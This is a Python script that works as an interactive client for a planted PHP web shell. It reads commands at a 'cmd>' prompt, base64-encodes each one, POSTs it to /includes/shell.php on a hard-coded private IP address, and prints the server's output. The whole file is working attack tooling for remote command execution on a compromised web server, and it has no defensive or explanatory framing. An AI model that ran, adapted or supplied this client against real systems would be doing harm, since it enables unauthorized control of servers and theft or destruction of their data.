import base64
from typing import Optional, Tuple

import requests

SCHEME = "http"
HOST = "10.143.4.133"
PATH = "/includes/shell.php"
TIMEOUT = 5
SEPARATOR = "=" * 60
SUB_SEPARATOR = "-" * 60


def build_url() -> str:
    return f"{SCHEME}://{HOST}{PATH}"


def encode_cmd(cmd: str) -> str:
    data = cmd.encode("utf-8", errors="ignore")
    return base64.b64encode(data).decode("ascii")


def send_command(cmd: str) -> Tuple[str, Optional[int]]:
    encoded = encode_cmd(cmd)
    url = build_url()
    try:
        res = requests.post(url, data={"c": encoded}, timeout=TIMEOUT)
    except requests.exceptions.Timeout:
        return "request timed out", None
    except requests.exceptions.ConnectionError:
        return "connection failed", None
    except requests.RequestException as exc:
        return f"request error: {exc}", None
    body = res.text.strip()
    if not res.ok:
        prefix = f"http {res.status_code}"
        if body:
            return f"{prefix}: {body}", res.status_code
        return prefix, res.status_code
    return body, res.status_code


def print_response(cmd: str, body: str, status: Optional[int]) -> None:
    print(SEPARATOR)
    print(f"cmd: {cmd}")
    if status is not None:
        print(f"status: {status}")
    print(SUB_SEPARATOR)
    text = body.strip()
    if not text:
        print("[no output]")
    else:
        lines = [line.rstrip() for line in text.splitlines()]
        blank = False
        for line in lines:
            if line:
                if blank:
                    blank = False
                print(line)
            else:
                if not blank:
                    print()
                    blank = True
    print(SEPARATOR)


def read_cmd() -> Optional[str]:
    try:
        value = input("cmd> ")
    except (EOFError, KeyboardInterrupt):
        return None
    value = value.strip()
    if not value or value.lower() in ("exit", "quit"):
        return None
    return value


def main() -> None:
    while True:
        cmd = read_cmd()
        if cmd is None:
            break
        body, status = send_command(cmd)
        print_response(cmd, body, status)


if __name__ == "__main__":
    main()

